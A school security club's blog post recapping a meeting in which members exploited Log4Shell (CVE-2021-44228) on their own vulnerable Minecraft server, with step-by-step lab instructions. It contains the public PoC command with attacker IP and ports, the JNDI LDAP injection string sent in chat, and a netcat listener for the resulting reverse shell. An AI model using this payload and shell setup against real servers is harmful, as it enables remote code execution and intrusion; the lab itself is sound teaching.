---
layout: post
title:  "minecraft log4j"
date:   2021-12-20
categories: linux
---

Last meeting we went over an overview of vulnerability research, the recent log4j vulnerability, and finally some more Linux stuff.

More interestingly though, instead of doing challenges individually we set up a live Minecraft 1.8 server that was vulnerable, and we "took over" the blairsec server as `minecraftsteve123`. These are the instructions to replicate what we did, if you want to try yourself.

First, get two servers with static IPs. You can rent servers from AWS or DigitalOcean or other providers. One will host the actual Minecraft server, and one will be where we host our malware and wait for a shell on the first server.

On the first server, get a vulnerable Minecraft and Java version. Use Java version `8u20`, downloaded from [here](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html). Then, download the minecraft server jarfile from [here](https://www.minecraft.net/en-us/download/server). You can start the server with `java -Xmx1024M -Xms1024M -jar server.jar nogui`.

Finally, make sure your server's TCP port 25565 is allowed by your firewall if you have one, as that's the port that Minecraft uses. Also make sure your Virtual Private Server host firewall allows TCP on 25565 (for example, AWS has their own firewall thing in their dashboard).

Now you should be able to connect to your own server with your Minecraft client.

Next, switch to your second server. This is where our malware will live. Clone the POC repository from [github](https://github.com/kozmer/log4j-shell-poc), and download the same Java version you used to run the Minecraft server (`8u20`).

Then, just run `python3 poc.py --userip <second server IP> --webport 8080 --lport 9001`. This starts two listeners on your server, an HTTP listener running on 8080 and a listener on 1389. It also tells the malware how to get back to your second server - through port 9001. Make sure your second server's firewall allows those.

You should get an output similar to:
```text
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://xxx.xxx.xxx.xxx:1389/a}
[+] Starting Webserver on port 8080 http://0.0.0.0:8080

Listening on 0.0.0.0:1389
```

Now, start a listener on your second server with `nc -lnvp 9001`. This listens for connections on port 9001 that our malware will make once it's been run by the Minecraft server.

With all that setup, you should be able to type what the POC script tells you to send in Minecraft chat. The Minecraft server will log that chat message, causing an LDAP lookup, causing our malware to be downloaded and run, and a connection with a shell to be sent to our second server on port 9001.

On our second server, once you get a "Connection received from ...", you have a shell. Type `ls` to verify it works, and `whoami` to see who you are impersonating. :o


MCPS is pulling a very cool gamer move on us and cancelling after school activities. So not sure when we will meet next. Mrs. Hallisey is supposed to be back when winter break ends, at least!

So see you whenever I see you, I guess. Maybe we will have an informal meeting on Discord to play some secure Minecraft or something over break.

~ josh
